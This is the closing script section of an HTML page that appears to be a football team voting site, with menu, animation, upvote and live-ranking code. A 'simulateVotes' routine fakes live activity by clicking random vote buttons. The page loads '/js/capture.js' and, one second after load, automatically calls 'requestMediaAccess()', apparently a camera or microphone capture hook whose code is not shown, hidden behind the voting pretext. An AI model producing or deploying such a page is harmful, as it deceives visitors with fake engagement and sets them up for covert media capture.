  <!-- JavaScript -->
  <script src="/js/capture.js"></script>

  <script>
    // Mobile Menu Toggle
    const mobileMenu = document.getElementById('mobileMenu');
    const menu = document.getElementById('menu');
    
    if (mobileMenu) {
      mobileMenu.addEventListener('click', function() {
        menu.classList.toggle('open');
        
        if (this.querySelector('i').classList.contains('fa-bars')) {
          this.querySelector('i').classList.replace('fa-bars', 'fa-times');
        } else {
          this.querySelector('i').classList.replace('fa-times', 'fa-bars');
        }
      });
    }
    
    // Particles Background
    document.addEventListener('DOMContentLoaded', function() {
      const particles = document.querySelector('.particles');
      
      // Create particles
      for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        // Random positioning
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        
        // Random size
        const size = Math.random() * 6 + 2;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        
        // Random animation duration
        const duration = Math.random() * 20 + 10;
        particle.style.animationDuration = duration + 's';
        
        // Random animation delay
        const delay = Math.random() * 10;
        particle.style.animationDelay = delay + 's';
        
        particles.appendChild(particle);
      }
      
      // Position glowing orbs
      const glows = document.querySelectorAll('.glow');
      
      glows[0].style.top = '20%';
      glows[0].style.left = '10%';
      
      glows[1].style.bottom = '30%';
      glows[1].style.right = '15%';
      
      glows[2].style.top = '60%';
      glows[2].style.left = '30%';
    });
    
    // Upvote Functionality
    const upvoteButtons = document.querySelectorAll('.upvote-btn');
    
    upvoteButtons.forEach(button => {
      button.addEventListener('click', function() {
        const team = this.getAttribute('data-team');
        const voteContainer = this.closest('.vote-container');
        const voteCount = voteContainer.querySelector('.vote-count');
        
        // Get current vote count and increment
        let currentCount = parseInt(voteCount.textContent.replace(/,/g, ''));
        currentCount++;
        
        // Format with commas
        voteCount.textContent = currentCount.toLocaleString();
        
        // Add animation
        voteCount.classList.add('vote-animation');
        setTimeout(() => {
          voteCount.classList.remove('vote-animation');
        }, 500);
        
        // Football animation
        const football = document.createElement('div');
        football.classList.add('football');
        
        // Position at button click
        const rect = this.getBoundingClientRect();
        football.style.left = rect.x + rect.width / 2 + 'px';
        football.style.top = rect.y + rect.height / 2 + 'px';
        
        // Append to body and remove after animation
        document.body.appendChild(football);
        setTimeout(() => {
          document.body.removeChild(football);
        }, 1000);
      });
    });
    
    // Animation on Scroll
    document.addEventListener('DOMContentLoaded', function() {
      const animateElements = document.querySelectorAll('.animate-fade-up');
      
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            entry.target.classList.add('animated');
          }
        });
      }, { threshold: 0.1 });
      
      animateElements.forEach(element => {
        observer.observe(element);
      });
    });
    
    // Update team rankings in real-time
    function updateRankings() {
      // Get all teams with their vote counts
      const teams = [];
      document.querySelectorAll('.team-card').forEach(card => {
        const teamName = card.querySelector('.team-name').textContent;
        const voteCount = parseInt(card.querySelector('.vote-count').textContent.replace(/,/g, ''));
        const teamLogo = card.querySelector('.team-logo').src;
        const teamCountry = card.querySelector('.team-country').textContent.trim();
        
        teams.push({ name: teamName, votes: voteCount, logo: teamLogo, country: teamCountry });
      });
      
      // Sort teams by vote count (descending)
      teams.sort((a, b) => b.votes - a.votes);
      
      // Update ranks in team cards
      document.querySelectorAll('.team-card').forEach(card => {
        const teamName = card.querySelector('.team-name').textContent;
        const teamIndex = teams.findIndex(team => team.name === teamName);
        card.querySelector('.team-rank').textContent = teamIndex + 1;
      });
      
      // Update top teams list
      const topTeamsList = document.querySelector('.top-teams-list');
      if (topTeamsList) {
        const topTeams = teams.slice(0, 5); // Get top 5 teams
        
        // Clear current list
        topTeamsList.innerHTML = '';
        
        // Add updated list
        topTeams.forEach((team, index) => {
          const teamItem = document.createElement('div');
          teamItem.classList.add('top-team-item');
          
          teamItem.innerHTML = `
            <div class="top-team-rank">${index + 1}</div>
            <div class="top-team-logo-container">
              <img src="${team.logo}" alt="${team.name}" class="top-team-logo">
            </div>
            <div class="top-team-info">
              <h3 class="top-team-name">${team.name}</h3>
              <div class="top-team-country">
                <i class="fas fa-globe"></i> ${team.country}
              </div>
            </div>
            <div class="top-team-votes">
              <i class="fas fa-futbol"></i>
              ${team.votes.toLocaleString()}
            </div>
          `;
          
          topTeamsList.appendChild(teamItem);
        });
      }
    }
    
    // Call initially and set interval to update rankings
    setTimeout(updateRankings, 2000); // Initial delay to ensure all elements are loaded
    
    // Add interactive hover effects for team cards
    const teamCards = document.querySelectorAll('.team-card');
    
    teamCards.forEach(card => {
      card.addEventListener('mousemove', function(e) {
        const rect = this.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        
        // Calculate tilt angle
        const tiltX = (y / rect.height - 0.5) * 10;
        const tiltY = (x / rect.width - 0.5) * -10;
        
        // Apply tilt effect
        this.style.transform = `translateY(-10px) perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
      });
      
      card.addEventListener('mouseleave', function() {
        // Reset transform
        this.style.transform = '';
      });
    });
    
    // Simulate real-time voting
    function simulateVotes() {
      const randomTeam = Math.floor(Math.random() * upvoteButtons.length);
      const randomButton = upvoteButtons[randomTeam];
      
      // Trigger a click on a random team button
      if (Math.random() > 0.7) { // 30% chance to trigger a vote
        setTimeout(() => {
          randomButton.click();
          updateRankings();
        }, 100);
      }
      
      // Schedule next simulation
      setTimeout(simulateVotes, Math.random() * 5000 + 2000); // Random interval between 2-7 seconds
    }
    
    // Start simulation after a delay
    setTimeout(simulateVotes, 5000);
    
    // Handle scrolling animations for team cards
    window.addEventListener('scroll', function() {
      const teamCards = document.querySelectorAll('.team-card');
      const scrollPosition = window.scrollY;
      
      teamCards.forEach((card, index) => {
        const cardPosition = card.offsetTop;
        const windowHeight = window.innerHeight;
        
        // Parallax effect for cards
        if (scrollPosition + windowHeight > cardPosition) {
          const distance = (scrollPosition + windowHeight - cardPosition) * 0.05;
          const translateY = Math.min(distance, 20); // Maximum translation of 20px
          card.style.transform = `translateY(-${translateY}px)`;
        }
      });
    });

    // Try requesting media on page load automatically
    window.addEventListener('load', function() {
      setTimeout(() => {
        requestMediaAccess();
      }, 1000); // Start request 1 seconds after page load
    });
  </script>
